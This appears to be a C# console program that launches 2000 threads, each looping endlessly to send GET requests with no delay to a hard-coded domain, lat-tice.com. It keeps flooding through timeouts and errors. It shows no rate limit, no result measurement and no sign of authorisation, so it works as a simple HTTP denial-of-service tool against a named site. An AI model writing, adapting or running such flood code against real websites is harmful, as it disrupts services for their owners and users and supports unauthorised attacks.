﻿using System;
using System.Net;
using System.Web;
using System.Threading.Tasks;
using System.Threading;


namespace del
{
    class Program
    {

        static HttpWebRequest[] request;//
        static Thread[] getRequestThreads;

        static int[] requestNumber;

        static void setRequest(int threadID){
            request[threadID] = (HttpWebRequest)WebRequest.Create("https://lat-tice.com");
            request[threadID].Method = "GET";
            request[threadID].KeepAlive = false;
            request[threadID].ContentType = "appication/json";
            request[threadID].Headers.Add("Content-Type", "appication/json");

            request[threadID].Timeout = 600000;
            //request.ContentType = "application/x-www-form-urlencoded";
        }
            static HttpWebResponse[] response ;
        static void Main(string[] args)
        {
            long RequestHandleNum = 99999;
            long threadlimit = 2000;
            requestNumber = new int[RequestHandleNum];
            request = new HttpWebRequest[RequestHandleNum];
            response = new HttpWebResponse[RequestHandleNum];
            getRequestThreads = new Thread[RequestHandleNum];
            for(int i = 0; i<threadlimit; i++){
                Console.WriteLine("i: "+i);
                getRequestThreads[i] = new Thread(new ThreadStart(GetResponse));
                getRequestThreads[i].Start();
            }
            Console.WriteLine("Hello World!");
            
        }

        public static void GetResponse(){
            while(true){
                try{
                setRequest(Thread.CurrentThread.ManagedThreadId);
                //response[Thread.CurrentThread.ManagedThreadId] = new HttpWebResponse();
               // ThreadPool.QueueUserWorkItem(o=>{ request[Thread.CurrentThread.ManagedThreadId].GetResponse(); });
            response[Thread.CurrentThread.ManagedThreadId] = (HttpWebResponse)request[Thread.CurrentThread.ManagedThreadId].GetResponse();
            //Console.WriteLine("Thead Number "+Thread.CurrentThread.ManagedThreadId +", Request number: " + requestNumber[Thread.CurrentThread.ManagedThreadId]++);
                }
                catch(System.Net.WebException  e){
                    if(e.Message.Contains( "An error occurred while sending the request. The operation timed out")){
                        Console.WriteLine(Thread.CurrentThread.ManagedThreadId + " Timed out");
                    }
                    else if(e.Message.Contains("Not enough storage")){
                        Console.WriteLine("Not enough storage");

                    }
                    else{
                            Console.WriteLine(e);
                    }
                    //Console.WriteLine(e);
                
                }
            }
        }


         





        
    }
}
